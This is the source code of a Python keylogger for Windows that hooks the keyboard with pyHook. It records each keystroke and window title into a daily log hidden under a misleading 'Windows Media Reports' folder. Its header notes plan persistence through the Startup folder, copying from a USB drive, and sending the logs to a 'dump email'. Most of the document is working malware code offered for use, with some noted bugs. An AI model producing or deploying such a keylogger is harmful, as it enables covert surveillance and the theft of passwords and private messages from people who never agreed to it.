"""
								Note
- C:\\Users\\Henry\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup

								To Do
- Create a bash or python script that moves the files from usb to startup folder
- Send file to dump email
- 

								Bugs 
- All letters are caplitlized
- Numbers are mixed in where characters should be

"""

import pyHook, pythoncom, os
from datetime import datetime
# get user's name so we can go to the directory
from pathlib import Path

# get's the current user's home directory 
home = str(Path.home())

# where to create new folder 
newFolderDir = home + '\\Document\\Windows Media Reports\\' 

todays_date = datetime.now().strftime('%Y-%b-%d')
file_name = home + '\\Document\\Windows Media Reports\\' + todays_date + '.txt'

line_buffer = "" #current typed line before return character
window_name = "" #current window

# C:\Users\Henry\Document\Windows Media Reports\
# create the folder for where the 
def create_Directory():
    if not os.path.exists(newFolderDir):
        os.makedirs(newFolderDir)

# save the buffer to the file
def SaveLineToFile(line):
    todays_file = open(file_name, 'a') #open todays file (append mode)
    todays_file.write(line) #append line to file
    todays_file.close() #close todays file

# record the user's strokes
def OnKeyboardEvent(event):
    global line_buffer
    global window_name
    #print 'Ascii:', event.KeyID, chr(event.KeyID) #pressed value

    """if typing in new window"""
    if(window_name != event.WindowName): #if typing in new window
        if(line_buffer != ""): #if line buffer is not empty
            line_buffer += '\n'
            SaveLineToFile(line_buffer) #print to file: any non printed characters from old window

        line_buffer = "" #clear the line buffer
        SaveLineToFile('\n-----WindowName: ' + event.WindowName + '\n') #print to file: the new window name
        window_name = event.WindowName #set the new window name

    """if return or tab key pressed"""
    if(event.KeyID == 13 or event.KeyID == 9): #return key
        line_buffer += '\n'
        SaveLineToFile(line_buffer) #print to file: the line buffer
        line_buffer = "" #clear the line buffer
        return True #exit event

    """if backspace key pressed"""
    if(event.KeyID == 8): #backspace key
        line_buffer = line_buffer[:-1] #remove last character
        return True #exit event

    """if non-normal ascii character"""
    if(event.KeyID < 32 or event.KeyID > 126):
        if(event.KeyID == 0): #unknown character (eg arrow key, shift, ctrl, alt)
            pass #do nothing
        else:
            if(event.KeyID == 190):
                line_buffer = line_buffer + '.'     
            else:
                line_buffer = line_buffer + str(event.KeyID) + '\n'
    else:
        line_buffer += chr(event.KeyID) #add pressed character to line buffer
        
    return True #pass event to other handlers

#creates the directory 
create_Directory()

hooks_manager = pyHook.HookManager() #create hook manager
hooks_manager.KeyDown = OnKeyboardEvent #watch for key press
hooks_manager.HookKeyboard() #set the hook
pythoncom.PumpMessages() #wait for events﻿

